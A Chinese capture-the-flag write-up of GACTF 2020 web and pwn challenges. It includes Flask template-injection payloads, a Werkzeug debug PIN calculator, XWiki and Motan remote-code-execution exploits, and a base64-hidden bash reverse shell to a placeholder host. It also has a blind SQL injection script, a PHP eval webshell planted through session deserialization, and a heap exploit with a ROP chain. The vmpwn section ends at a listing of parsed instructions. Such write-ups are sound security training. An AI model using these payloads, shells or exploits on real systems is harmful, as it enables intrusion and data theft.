> 原文链接: https://www.anquanke.com//post/id/216289 


# GACTF 2020 Vidar-Team Writeup


                                阅读量   
                                **161022**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01265bb63e1036b596.jpg)](https://p3.ssl.qhimg.com/t01265bb63e1036b596.jpg)



## web

### <a class="reference-link" name="EZFLASK"></a>EZFLASK

> flask&amp;flask

python2

```
# -*- coding: utf-8 -*-
from flask import Flask, request
import requests
from waf import *
import time
app = Flask(__name__)

@app.route('/ctfhint')
def ctf():
    hint =xxxx # hints
    trick = xxxx # trick
    return trick

@app.route('/')
def index():
    # app.txt
@app.route('/eval', methods=["POST"])
def my_eval():
    # post eval
@app.route(xxxxxx, methods=["POST"]) # Secret
def admin():
    # admin requests
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)
```

POST `eval=ctf.__code__.co_consts`<br>
得到 `(None, 'the admin route :h4rdt0f1nd_9792uagcaca00qjaf&lt;!-- port : 5000 --&gt;', 'too young too simple')`

访问上面拿到的admin路由，POST `admin.__code__.co_names`看到admin方法调用了这些函数`('request', 'form', 'waf_ip', 'waf_path', 'len', 'requests', 'get', 'format', 'text')`

然后waf_ip函数里有这些变量`(None, '0.0', '192', '172', '10.0', '233.233', '1234567890.', 15, '.', 4)`<br>
经测试，根据上面这些变量猜测waf逻辑为，ip中不能出现`'0.0', '192', '172', '10.0', '233.233'`、由数字和`.`组成、长度小于15、具有4段

POST `http://124.70.206.91:10009/h4rdt0f1nd_9792uagcaca00qjaf` `ip=127.1.1.1&amp;port=5000&amp;path=/`

拿到源码

```
import flask
from xxxx import flag
app = flask.Flask(__name__)
app.config['FLAG'] = flag
@app.route('/')
def index():
    return open('app.txt').read()
@app.route('/&lt;path:hack&gt;')
def hack(hack):
    return flask.render_template_string(hack)
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```

将上述POST的path改为``{``{`url_for.__globals__.current_app["con"+"fig"]`}``}``读取`config`得到flag

### <a class="reference-link" name="simpleflask"></a>simpleflask

```
if name == "":
        return render_template_string("&lt;h1&gt;hello world!&lt;h1&gt;")

    check(name)
    template = '&lt;h1&gt;hello `{``}`!&lt;h1&gt;'.format(name)
    res = render_template_string(template)
    if "flag" in res:
        abort(500, "hacker")
    return res
```

`name=`{``{`.`}``}`` 会触发 Flask 报错，输入正确的 pin 即有 Flask 自带的 shell。

`name=`{``{`().__class__.__bases__[0].__subclasses__()`}``}``<br>
读文件，构造 pin 码。

`name=`{``{`().__class__.__bases__[0].__subclasses__()[434].__init__.__globals__.sys.argv`}``}``

得到：`['/home/ctf/app.py']`

UUID get<em>node:<br>
name=`{``{`().**class**.**bases**[0].**subclasses**()[396].**init**.**_globals**</em>.getnode()`}``}`

machine<em>id：<br>
name=`{``{`().**class**.**bases**[0].**subclasses**()[458].**init**.**_globals**</em>`}``}`

计算出 pin 码

```
from itertools import chain
import hashlib
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378154503',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'a8eb6cac33e701ae867269db5ce80e7f79a0b2aa07d319fcb3e1d7588a7f75d5396d7ae8d223aec387a46e9a16d101a3'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

拿到 Pin 码后，随便 POST 如：``{``{`.`}``}`` 导致报错返回 Debug 信息，输入 pin 即可使用控制台。<br>
执行：

```
f = open("/flag")
f.read()
```

拿到 Flag。

### <a class="reference-link" name="XWiki"></a>XWiki

`CVE-2020-11057`

> XWiki Platform是法国XWiki公司的一套用于创建Web协作应用程序的Wiki平台。 XWiki Platform 7.2版本至11.10.2版本（已在11.3.7版本、11.10.3版本和12.0版本中修复）中存在代码注入漏洞。攻击者可通过编辑个人仪表板利用该漏洞执行python/groovy脚本。

题目版本 11.10.1

按照这篇文章的方法弹 shell 即可：<br>[https://jira.xwiki.org/browse/XWIKI-16960](https://jira.xwiki.org/browse/XWIKI-16960)

```
Full path to reproduce:

1) Create new user on xwiki.org (or myxwiki.org)
2) Go to profile -&gt; Edit -&gt; My dashboard -&gt; Add gadget
3) Choose either python or groovy.
4) Paste following python/groovy code (for unix powered xwiki)

import os
print(os.popen("id").read())
print(os.popen("hostname").read())
print(os.popen("ifconfig").read())
```

弹上去后发现`readflag`文件，下载到本地进行逆向

```
import re

from pwn import *
from Crypto.Util.number import long_to_bytes

#context.log_level = 'debug'

p = process('./readflag')

m = ''

while True:
    try:
        line = p.recvline().decode()
    except EOFError:
        break
    #print(line)
    if line.startswith('Which number is bigger?'):
        a, b = map(int, re.search(r'\s(\d+)\s\:\s(\d+)\n', line).groups())
        if a &lt; b:
            p.sendline('1')
            m += '1'
        elif a &gt; b:
            p.sendline('0')
            m += '0'
        else:
            raise RuntimeError

#p.interactive()
p.close()

print(long_to_bytes(int(m, 2)))
```

### <a class="reference-link" name="say%20hello%20to%20the%20world"></a>say hello to the world

搜已知漏洞的时候搜到 RCE。<br>[https://github.com/plr47/CVE_REQUEST/blob/master/Mine/Motan/MOTAN%20RCE.md](https://github.com/plr47/CVE_REQUEST/blob/master/Mine/Motan/MOTAN%20RCE.md)

Exploit.java

```
public class Exploit `{`
    static `{`
        try `{`
            Runtime.getRuntime().exec("bash -c `{`echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4eC54eHgueHh4Lnh4eC8yMDAwMCAwPiYx`}`|`{`base64,-d`}`|`{`bash,-i`}`");
        `}` catch (Exception e)`{`
            e.printStackTrace();
        `}`
    `}`
```

执行`javac Exploit.java`。

修改 POC，注意字符串长度要一致，因此服务器开了个两位数的端口：

```
import socket
import time
import re

def sendEvilObjData(sock):
    payload = "f1f1000017405557170000010000034df0f0010017405557170000010000033daced0005772e0015717569636b73746172742e466f6f536572766963650003776f6300106a6176612e6c616e672e4f626a656374757200025b42acf317f8060854e002000078700000028d48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a64617461536f757263650a726f77536574547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e1d6c6461703a2f2f3132372e302e302e313a393939392f4578706c6f6974cbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03666f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a776300000005000b6170706c69636174696f6e00056d6f74616e000b636c69656e7447726f7570000b64656661756c745f72706300066d6f64756c6500056d6f74616e000776657273696f6e0003312e30000567726f7570000b64656661756c745f727063"
    payload = payload.decode('hex')
    payload = payload.replace('127.0.0.1:9999', 'xx.xx.xx.xx:99')    # change to your host
    sock.send(payload)
def run(dip,dport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_addr = (dip, dport)
    sock.connect(server_addr)
    sendEvilObjData(sock)

run("124.70.166.10",8002)
```

然后跟着文章描述，在服务器上用 Python 起一个 SimpleHTTPServer 用于获取文件，并将编译后的`Exploit.class`放到目录下，再用 marshalsec 起一个 LDAP 服务。<br>
运行上述 exp 即可 get shell。

### <a class="reference-link" name="carefuleyes"></a>carefuleyes

根据提示`/www.zip`下有源码

在上传的文件名插入payload<br>
在rename.php中，将数据库中的脏数据直接取出，拼入sql语句中，此处可以二次注入

```
import requests
import tqdm
import time


out=''
for num in tqdm.tqdm(range(1,30)):
    for target_char in range(32,126): 
        files = `{`"upfile": ("1' and if(ascii(substr((select group_concat(username,password) from user where privilege='admin'),`{`0`}`,1))=`{`1`}`,sleep(2),1) or '.txt".format(str(num), str(target_char)), open("233", "rb"), "text/plain")`}`
        data = `{`"newname": "233", "oldname": "1' and if(ascii(substr((select group_concat(username,password) from user where privilege='admin'),`{`0`}`,1))=`{`1`}`,sleep(2),1) or '".format(str(num), str(target_char))`}`

        req = requests.post("http://124.71.191.175/upload.php", files=files)
        before_time = time.time()
        req = requests.post("http://124.71.191.175/rename.php", data=data)
        after_time = time.time()
        offset = after_time - before_time
        if offset &gt; 2:
            out += chr(target_char)
            break
print(out)
```

然后反序列化

```
&lt;?php

class XCTFGG
`{`
    private $method;
    private $args;

    public function __construct($method, $args)
    `{`
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    `}`
`}`

$a = new XCTFGG("login",["XM", "qweqweqwe"]);
echo urlencode(serialize($a));
```

### <a class="reference-link" name="babyshop"></a>babyshop

发现 .git 泄露，源码拖下来。

`init.php`手动去混淆后:

```
&lt;?php
class 造化之神 `{`
    // 构造函数
    function __construct() `{`
        $this-&gt;融合();
    `}`
    function 融合() `{`
        global $天书,$异闻录,$实物长度,$寻根,$奇语切片,$出窍,$遮天之术,$虚空之数, $实打实在,$虚无缥缈;

        // $虚空之数 = NULL

        $天书=array("阿尔法","喝彩","查理","三角洲","回声","狐步舞","高尔夫球","旅馆","印度","朱丽叶","公斤","利马","麦克","十一月","奥斯卡","爸爸","魁北克","罗密欧","塞拉","探戈","制服","胜利者","威士忌","伦琴射线","扬基","祖鲁");

        $实物长度='strlen';

        $寻根='strpos';

        $奇语切片='str_split';

        $出窍='array_pop';

        $遮天之术='base64_decode';

        $虚空之数=0;

        $实打实在 = true;
        $虚无缥缈 = false;
        $异闻录= '+=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz./0123456789';
    `}`
`}`

// 上面是加密的构造函数，可以不管
new 造化之神();

$千奇百出="余壶血史两恐自扩劫盏铁天";

$来者无惧="余壶仍灯两恐尽天";

ini_set('display_errors', 'N');

$宝物="冻实史畏言秀倾服沃尽天夫";

class 造齿轮 `{`
    protected$朝拜圣地;
    protected$贡品;
    protected$圣殿;
    protected$禁地;

    public function __construct() `{`
        $this-&gt;朝拜圣地 = 'storage';
        if(!is_dir($this-&gt;朝拜圣地))`{`
            mkdir($this-&gt;朝拜圣地);
        `}`

        $this-&gt;禁地 = array('php', 'flag', 'html', 'htaccess');
    `}`

    // 检查 Cookie 里是否有黑名单
    public function 挖掘($货物, $食物) `{`
        foreach($this-&gt;禁地 as $元素) `{`
            if(stripos(@$_COOKIE[$食物], $元素) !== false) `{`
                die('invaild ' . $食物);
                return false;
            `}`
        `}`

        $this-&gt;圣殿 = session_id();
        return true;
    `}`

    // 写文件
    public function 种植($货物,$食物) `{`
        $this-&gt;贡品 = $货物;
        return file_put_contents($this-&gt;朝拜圣地.'/sess_'.$货物,$食物);
    `}`

    // 读文件
    public function 收获($货物) `{`
        $this-&gt;贡品=$货物;
        return (string)@file_get_contents($this-&gt;朝拜圣地.'/sess_'.$货物);
    `}`


    public function 总结($货物) `{`
        global$实物长度,$虚无缥缈;
        if(strlen($this-&gt;圣殿) &lt;= 0)`{`
            return;
        `}`
        return file_put_contents($this-&gt;朝拜圣地.'/note_'.$this-&gt;圣殿,$货物)===$虚无缥缈?$虚无缥缈:true;
    `}`

    public function 归纳() `{`
        return (string)@file_get_contents($this-&gt;朝拜圣地.'/note_'.$this-&gt;贡品);
    `}`

    public function 思考($货物) `{`
        $this-&gt;贡品=$货物;
        if(file_exists($this-&gt;朝拜圣地.'/sess_'.$货物)) `{`
            unlink($this-&gt;朝拜圣地.'/sess_'.$货物);
        `}`
        return true;
    `}`
    public function 反省($货物) `{`
        foreach(glob($this-&gt;朝拜圣地.'/*') as $元素) `{`
            if(filemtime($元素) + $货物 &lt; time() &amp;&amp; file_exists($元素)) `{`
                unlink($元素);
            `}`
        `}`
        return true;
    `}`
    public function 完毕() `{`
        return true;
    `}`

    public function __destruct() `{`
        $this-&gt;总结($this-&gt;归纳());
    `}`
`}`

$齿轮 = new 造齿轮();

// 设置处理 Session 的 Handler
session_set_save_handler(array($齿轮,'挖掘'),array($齿轮,'完毕'),array($齿轮,'收获'),array($齿轮,'种植'),array($齿轮,'反省'),array($齿轮,'完毕'));

session_start();

srand(mktime(0,0,0,0,0,0));

$盛世=array(rand()=&gt;array('alice',0b1),rand()=&gt;array('bob',0b101),rand()=&gt;array('cat',0b10100),rand()=&gt;array('dog',0b1111),rand()=&gt;array('evil',0b101),rand()=&gt;array('flag',0b10011100001111));

function 化缘() `{`
    return $_SESSION['balance'];
`}`
function 取经() `{`
    global$盛世;
    $宝藏='[';
    foreach($_SESSION['items'] as $元素)`{`
        $宝藏 .= $盛世[$元素][0].', ';
    `}`
    $宝藏.=']';

    return $宝藏;
`}`
function 念经() `{`
    global $齿轮;
    return $齿轮-&gt;归纳();
`}`
function 造世() `{`
    global $盛世;
    $宝藏='';
    foreach($盛世 as $按键=&gt;$元素)`{`
        $宝藏 .=
        '&lt;div class="item"&gt;&lt;form method="POST"&gt;&lt;div class="form-group"&gt;'.
            $元素[0].
        '&lt;/div&gt;&lt;div class="form-group"&gt;&lt;input type="hidden" name="id" value=""'.
            $按键.
        '"&gt;&lt;button type="submit" class="btn btn-success"&gt;buy ($'.$元素[1].')&lt;/button&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;';
    `}`
    return $宝藏;
`}`

if(!isset($_SESSION['balance']))`{`
    $_SESSION['balance'] = 0b1000101110010/2;
`}`

if(!isset($_SESSION['items']))`{`
    $_SESSION['items'] = [];
`}`

if(!isset($_SESSION['note']))`{`
    $_SESSION['note'] = '';
`}`;

if(isset($_POST['id'])) `{`
    if($_SESSION['balance'] &gt;= $盛世[$_POST['id']][1]) `{`
        $_SESSION['balance'] = $_SESSION['balance']-$盛世[$_POST['id']][1];
        array_push($_SESSION['items'], $_POST['id']);
        echo('&lt;span style="color:green"&gt;buy succ!&lt;/span&gt;');
    `}` else `{`
        echo('&lt;span style="color:red"&gt;lack of balance!&lt;/span&gt;');
    `}`
`}`
if(isset($_POST['note'])) `{`
    if(strlen($_POST['note'])&lt;=1&lt;&lt;10) `{`
        $齿轮-&gt;总结(str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','"&amp;gt;'), $_POST['note']));
        echo('&lt;span style="color:green"&gt;write succ!&lt;/span&gt;');
    `}` else `{`
        echo('&lt;span style="color:red"&gt;note too long!&lt;/span&gt;');
    `}`
`}`
?&gt;
```

可以看到即使我们购买了 flag，也只是修改了下 session 而已，因此猜测可能需要写 Shell。

在解析 Session 时，会对 Session 进行反序列化，如果能写 Session 文件，则可以反序列化`造齿轮`类，执行析构函数的时候写的文件名`$this-&gt;圣殿`可控，可写入`.php`文件。
<li>构造 Session
<pre><code class="lang-php hljs">&lt;?php
class 造齿轮 `{`
 protected $朝拜圣地 = 'storage';
 protected $贡品 = 'not_exist_file/../sess_e99shell';
 protected $圣殿 = 'e99nb.php';
 protected $禁地 = '';
`}`
ini_set('session.save_path', '.');
session_start();
$_SESSION['a'] = new 造齿轮();
</code></pre>
本地运行，这样在当前目录下，就生成了一个序列化后的 Session 文件。
</li>
<li>伪造 Session<br>
不带 Session 访问题目，后端会返回给我们一个新的 Session ID，同时在`storage`下有了一个`sess_xxxxxx`文件。（无`note_`文件生成）假设生成的是`sess_abcdef`。<br>
设置 Cookie 为`PHPSESSID=abcdef/../sess_e99e99e99`，同时 POST 发送`note`，值为上文中序列化 Session 文件的内容。</li>
这时`收获()`方法实际上是：

```
file_get_contents('storage/sess_abcdef/../sess_e99e99e99');
```

因为已经存在`sess_abcdef`这个**文件**，把其当做目录取上一层`..`，PHP 会执行失败。

`总结()`方法执行：

```
file_put_contents('storage/note_abcdef/../sess_e99e99e99', 'xxxxx');
```

因为`note_abcdef`不存在，因此实际上为`storage/sess_e99e99e99`，执行成功。

这个时候访问`storage/sess_e99e99e99`，可以发现我们的 Session 已经成功写入。
<li>写 Shell 文件内容<br>
我们使用析构函数中的`$this-&gt;总结($this-&gt;归纳());`写 Shell，其中 Shell 的内容需要从`storage`下的文件中读取。<br>
题目中对`note`的内容做了过滤，替换了`&lt;` `&gt;` `&amp;`这几个字符，因此我们尝试将 Shell 写入`sess_`文件。当然可以用上面第二步中写 Session 文件的办法，不过更简单的办法是在购买商品页面，将购买商品的 `id` 的内容修改成我们的 Shell，然后点击购买，这样这个 `id` 下标会被写入 Session 中。<br>
这里将 Cookie 改为`PHPSESSID=e99shell`，购买商品时修改 id，即可创建文件`storage/sess_e99shell`。之后反序列化时读取此文件内容，再写文件即可。</li>
exp:

```
import requests
import binascii
import base64

url = 'http://119.3.111.239:8010'

# 1. get a php session id, create the sess_ file.
resp = requests.get(url)
cookie = requests.utils.dict_from_cookiejar(resp.cookies)
php_sessid = cookie['PHPSESSID']

# 2. write the session.
payload = b'YXxPOjk6IumAoOm9v+i9riI6NDp7czoxNToiACoA5pyd5ouc5Zyj5ZywIjtzOjc6InN0b3JhZ2UiO3M6OToiACoA6LSh5ZOBIjtzOjMxOiJub3RfZXhpc3RfZmlsZS8uLi9zZXNzX2U5OXNoZWxsIjtzOjk6IgAqAOWco+auvyI7czo5OiJlOTluYi5waHAiO3M6OToiACoA56aB5ZywIjtzOjA6IiI7fQ=='
requests.post(url, data=`{`
    'note': base64.b64decode(payload)
`}`, headers=`{`'Cookie': 'PHPSESSID=' + php_sessid + '/../sess_e99e99e99'`}`)

# 3. write shell content.
requests.post(url, data=`{`
    'id': '&lt;?php @eval($_POST["cardinal"]);exit(); ?&gt;'
`}`, headers=`{`'Cookie': 'PHPSESSID=e99shell'`}`)

# 4. write the shell.
requests.get(url, headers=`{`'Cookie': 'PHPSESSID=e99e99e99'`}`)

# 5. done!
resp = requests.post(url + '/storage/note_e99nb.php', data=`{`
    'cardinal': "system('cat /flag');"
`}`)
print(resp.text)
```



## pwn

### <a class="reference-link" name="card"></a>card

禁用了execve

有普通的edit和隐藏的edit，隐藏的edit是直接read

普通的edit是先read，然后strcpy，可以溢出

```
__asm `{` endbr64 `}`
  memset(src, 0, (int)a2);
  read(0, src, a2);
  return strcpy(a1, src);
```

这里只memset了对应的size，如果之前多写了一些就不会被置零，后面strcpy也会被copy进去，所以可以越界写

先越界改chunk的size字段，造成chunk overlap，然后利用切割unsorted bin的main_arena，爆破得到_IO_2_1_stdout，修改_IO_write_base的低字节，leak出libc

然后改__free_hook为printf，利用格式化字符串在栈上布局好栈迁移的ROP，最后栈迁移到bss段进行ORW

exp(数据量很大，远程要跑很久):

```
#coding=utf8

from PwnContext import *

context.terminal = ['xfce4-terminal', '--tab', '-x', 'zsh', '-c']
context.log_level = 'info'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)
ru      = lambda delims,timeout=2, drop=True  :ctx.recvuntil(delims, drop, timeout=timeout)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('`{``}` = `{`:#x`}`'.format(name, addr))

ctx.binary = './card'
ctx.remote = ('119.3.154.59', 9777)
#ctx.custom_lib_dir = './'
ctx.remote_libc = './libc.so.6'
ctx.debug_remote_libc = True


def add(sz):
    sla('Choice:', '1')
    sla('Size: ', str(sz))


def edit(idx, content):
    sla('Choice:', '2')
    sla('Index: ', str(idx))
    sa('Message: ', content)


def free(idx):
    sla('Choice:', '3')
    sla('Index: ', str(idx))


def raw_edit(idx, content):
    sla('Choice:', '5')
    sla('Index: ', str(idx))
    sa('Message: ', content)

#rs()
while True:
    try:
        rs('remote')
        #rs()
        add(0x18) # 0
        add(0x50) # 1
        add(0x60) # 2
        add(0x60) # 3
        add(0x70) # 4
        add(0x70) # 5
        add(0x80) # 6
        add(0x80) # 7
        add(0x90) # 8
        add(0x90) # 9
        add(0x10) # 10
        edit(1, b'a' * 0x18 + p64(0x60 + 0x70 * 2 + 0x80 * 2 + 0x90 * 2 + 0xa0 * 2 + 1))
        edit(0, b'a' * 0x18)


        free(3)
        free(2)
        free(1)

        add(0x50) # 1
        add(0x430) # 2

        # leak libc

        raw_edit(2, '\xa0\xd6')

        add(0x60) # 3
        add(0x60) # 11

        raw_edit(11, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
        sleep(0.1)

        ru('\x00' * 8)
        lbase = u64(r(8)) - (0x7ffff7fc0980 - 0x7ffff7dd5000)
        leak('lbase', lbase)

        if (lbase &amp; 0x700000000000) != 0x700000000000:
            raise EOFError()

        break
    except KeyboardInterrupt:
        exit()
    except EOFError:
        continue


__free_hook = lbase + ctx.libc.sym['__free_hook']

add(0x18)#12
add(0x18)#13
add(0x1f8)#14
add(0x1f8)#15
edit(14,b'a'*0x18+p64(0x221))
edit(12,'a'*0x18)
free(13)
free(15)
free(14)
add(0x218)#13
edit(13,b'a'*8*4+p64(__free_hook))
edit(13,'a'*(8*3+7))
edit(13,'a'*(8*3+6))
edit(13,'a'*(8*3+5))
edit(13,'a'*(8*3+4))
edit(13,'a'*(8*3+3))
edit(13,b'a'*(8*3)+p64(0x201))
add(0x1f8)#14
add(0x1f8)#15


printf = lbase + ctx.libc.sym['printf']
edit(15, p64(printf))


idx = 16
def call_printf(s): 
    add(0x100) # 16
    edit(idx, s)
    free(idx)
    sleep(0.1)


call_printf("123%30$p%9$p")
sleep(0.1)
ru('123')
stack=int(r(14),16)
text=int(r(14),16) - (0x5555555558e4-0x555555554000)

leak('stack', stack)
leak('text', text)


call_printf("%`{``}`c%30$hn".format((stack - 0x60) &amp; 0xffff))
def write_byte(addr, byte):
    # 布置地址

    for i in range(8):
        ref = (stack - 0x60 + i) &amp; 0xff
        if ref &gt; 0:
            call_printf("%`{``}`c%30$hhn".format(ref))
        else:
            call_printf("%30$hhn")

        num = (addr &gt;&gt; (8 * i)) &amp; 0xff
        if num &gt; 0:
            call_printf("%`{``}`c%43$hhn".format(num))
        else:
            call_printf("%43$hhn")

    byte = ord(byte)

    if byte &gt; 0:
        call_printf("%`{``}`c%31$hhn".format(byte))
    else:
        call_printf("%31$hhn")

def write_content(addr, content):
    for i in range(len(content)):
        write_byte(addr+i, content[i])




rdi= 0x1963+text
rsi= 0x1961+text
rdx= 0x1626d5+lbase
bss = text + 0x004c60
leave_ret = text + 0x001869
add_rsp_pp_ret = lbase + 0x0000000000085bf8 + 2

ret_addr = stack - (0x7fffffffede8 - 0x7fffffffecd8)

rop=p64(rdi)+p64(bss+0x100)
rop+=p64(rsi)+p64(0) * 2
rop+=p64(rdx)+p64(0) * 3
rop+=p64(lbase+ctx.libc.sym['open'])

rop+=p64(rdi)+p64(3)
rop+=p64(rsi)+p64(bss) * 2
rop+=p64(rdx)+p64(0x100) * 3
rop+=p64(lbase+ctx.libc.sym['read'])


rop+=p64(rdi)+p64(1)
rop+=p64(rsi)+p64(bss) * 2
rop+=p64(rdx)+p64(0x100) * 3
rop+=p64(lbase+ctx.libc.sym['write'])

add(0x300) # 16

#dbg('b *0x5555555554B7\nc')
edit(16, '\x00' * 0x100 + './flag\x00\x00' + '\x00' * 8 + rop)



idx += 1
write_content(ret_addr+8, p64(add_rsp_pp_ret))
write_content(ret_addr+0x20, p64(bss+0x110-8))
write_content(ret_addr+0x28, p64(leave_ret))


context.log_level = 'debug'
write_content(ret_addr, '\x6a')

irt()
```

### <a class="reference-link" name="vmpwn"></a>vmpwn

禁用了execve只能ORW

写个脚本解析出指令后静态分析

用来解析指令的脚本

```
#coding=utf8
#!/usr/bin/python3

def parse_line(data, next_pc):
    try:
        op = data[next_pc]
        next_pc += 1
        if op == 0x10:
            msg = 'mov reg0, rsp'
        elif op &gt;= 0x11 and op &lt;= 0x13:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'mov reg%s, %s'%  (op - 0x11, hex(num))
        elif op == 0x20:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'mov reg0, &amp;data[%s]' % hex(num)
        elif op &gt;= 0x21 and op &lt;= 0x23:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'mov reg%s, data[%s]' % (op-0x21, hex(num))
        elif op &gt;= 0x33 and op &lt;= 0x35:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'mov data[%s], reg%s' % (hex(num), op-0x33)
        elif op &gt;= 0x44 and op &lt;= 0x46:
            msg = 'push reg%s' % (op-0x44)
        elif op &gt;= 0x51 and op &lt;= 0x53:
            msg = 'pop reg%s' % (op-0x51)
        elif op &gt;= 0x61 and op &lt;= 0x63:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'add reg%s, %s' % (op-0x61, hex(num))
        elif op &gt;= 0x64 and op &lt;= 66:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'sub reg%s, %s' % (op-0x64, hex(num))
        elif op &gt;= 0x67 and op &lt;= 0x69:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'mul reg%s, %s' % (op-0x67, hex(num))
        elif op &gt;= 0x6a and op &lt;= 0x6c:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'xor reg%s, %s' % (op-0x6a, hex(num))
        elif op &gt;= 0x6d and op &lt;= 0x6f:
            msg = 'xor reg%s, reg%s', (op-0x6d, op-0x6d)
        elif op == 0x7e:
            num = int.from_bytes(data[next_pc:next_pc+2], 'little', signed=True)
            next_pc += 2
            #next_pc += num
            msg = 'jmp %s' % hex(next_pc + num)
        elif op == 0x7f:
            msg = 'jmp reg0'
        elif op == 0x80:
            msg = 'call reg0'
        elif op == 0x81:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'add rsp, %s' % hex(num)
        elif op == 0x82:
            num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
            next_pc += 8
            msg = 'sub rsp, %s' % hex(num)
        elif op == 0x88:
            num = int.from_bytes(data[next_pc:next_pc+2], 'little', signed=True)
            next_pc += 2
            msg = 'call %s' % hex(next_pc + num)
        elif op == 0x8f:
            num = data[next_pc]
            next_pc += 1
            functions = ['read', 'write', 'puts', 'free']
            msg = 'syscall %s' % (functions[num])
        elif op == 0x90:
            msg = 'ret'
        elif op == 0xff:
            msg = 'halt'
            next_pc = -1
        else:
            msg = 'error op %s' % hex(op)
            next_pc = -1
    except:
        next_pc = -1
        msg = ''

    return next_pc, msg


def parse(data, pc):
    while pc != -1:
        next_pc, msg = parse_line(data, pc)
        print("%5s: %s" % (hex(pc), msg))
        pc = next_pc

def find_gadget(data):
    for i in range(len(data)):
        try:
            pc = i
            next_pc, msg = parse_line(data, pc)
            if ('syscall' in msg) or ('pop reg' in msg):
                count = 0
                print('-' * 0x10)
                while pc != -1 and count &lt; 5:
                    print('%5s: %s' % (hex(pc), msg))
                    pc = next_pc
                    count += 1
                    next_pc, msg = parse_line(data, pc)

        except:
            continue


if __name__ == '__main__':
    with open('code.txt', 'rb') as fd:
        data = fd.read()
    from sys import argv

    try:
        pc = int(argv[1], 16)
    except:
        pc = 0

    parse(data, pc)

    print('\n----------gadget------------')
    find_gadget(data)
```

解析结果关键位置:

```
0x0: jmp 0x3a8
  0x3: sub rsp, 0x100

......

0x29f: mov reg0, rsp
0x2a0: push reg0
0x2a1: pop reg1
0x2a2: mov reg0, 0x0
0x2ab: mov reg2, 0x1000
0x2b4: syscall read
0x2b6: mov reg0, rsp
0x2b7: syscall puts
....

0x301: mov reg0, &amp;data[0x0]
0x30a: push reg0
0x30b: pop reg1
0x30c: mov reg0, 0x1
0x315: mov reg2, 0x1b
0x31e: syscall write
